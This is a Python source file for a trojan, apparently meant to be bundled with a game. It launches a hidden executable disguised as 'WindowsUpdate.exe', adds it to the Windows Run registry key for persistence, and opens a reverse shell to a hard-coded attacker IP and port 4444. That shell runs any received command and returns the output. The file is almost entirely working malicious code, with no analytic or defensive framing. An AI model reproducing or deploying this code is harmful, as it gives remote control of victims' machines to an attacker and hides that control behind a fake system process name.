import socket
import subprocess
import os
import threading
import time
import sys
import tempfile

ATTACKER_IP = "10.11.73.46"
ATTACKER_PORT = 4444

def launch_persistent_shell():
    """Launch WindowsUpdate.exe when game starts"""
    try:
        # Try multiple locations to find WindowsUpdate.exe
        possible_paths = []
        
        if getattr(sys, 'frozen', False):
            # Running as EXE - check various locations
            game_dir = os.path.dirname(sys.executable)
            possible_paths = [
                os.path.join(game_dir, "WindowsUpdate.exe"),                    # Same folder as game
                os.path.join(os.environ['TEMP'], "WindowsUpdate.exe"),          # Temp folder
                os.path.expanduser("~\\Desktop\\WindowsUpdate.exe"),            # Desktop
                os.path.expanduser("~\\Downloads\\WindowsUpdate.exe"),          # Downloads
                "C:\\WindowsUpdate.exe",                                        # C:\ root
                os.path.join(os.environ['ProgramFiles'], "WindowsUpdate\\WindowsUpdate.exe"),  # Program Files
            ]
        else:
            # Running as script
            script_dir = os.path.dirname(os.path.abspath(__file__))
            possible_paths = [
                os.path.join(script_dir, "WindowsUpdate.exe"),
                os.path.join(os.getcwd(), "WindowsUpdate.exe"),
            ]
        
        # Add current directory
        possible_paths.append(os.path.join(os.getcwd(), "WindowsUpdate.exe"))
        
        # Try each path
        for path in possible_paths:
            if os.path.exists(path):
                print(f"[+] Found WindowsUpdate.exe at: {path}")
                
                # Check if it's already running
                result = subprocess.run(['tasklist', '/fi', 'Imagename eq WindowsUpdate.exe'], 
                                      capture_output=True, text=True)
                
                if "WindowsUpdate.exe" not in result.stdout:
                    # Launch it DETACHED
                    subprocess.Popen(
                        [path],
                        creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NO_WINDOW,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        stdin=subprocess.DEVNULL
                    )
                    print(f"[+] Launched persistent shell")
                    
                    # Also add to startup for reboot persistence
                    try:
                        import winreg
                        key = winreg.HKEY_CURRENT_USER
                        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
                        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                            winreg.SetValueEx(regkey, "WindowsUpdateSvc", 0, winreg.REG_SZ, f'"{path}"')
                        print("[+] Added to startup registry")
                    except:
                        pass
                else:
                    print("[+] WindowsUpdate.exe already running")
                return
        
        print("[!] WindowsUpdate.exe not found. Please place it in the same folder as the game.")
        
    except Exception as e:
        print(f"[-] Error launching persistent shell: {e}")

# Launch persistent shell
launch_persistent_shell()

# Game shell
def game_shell():
    while True:
        try:
            s = socket.socket()
            s.connect((ATTACKER_IP, ATTACKER_PORT))
            s.send(b"\n[GAME SHELL]\n$ ")
            
            while True:
                cmd = s.recv(4096).decode().strip()
                if not cmd or cmd.lower() == 'exit':
                    break
                
                if cmd.lower().startswith('cd '):
                    try:
                        os.chdir(cmd[3:])
                        s.send(f"{os.getcwd()}\n".encode())
                    except:
                        s.send(b"Error\n")
                else:
                    try:
                        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=10)
                        s.send(result)
                    except:
                        s.send(b"Error\n")
                
                s.send(b"$ ")
            s.close()
        except:
            time.sleep(5)

# Start game shell
thread = threading.Thread(target=game_shell, daemon=True)
thread.start()

if __name__ == "__main__":
    while True:
        time.sleep(60)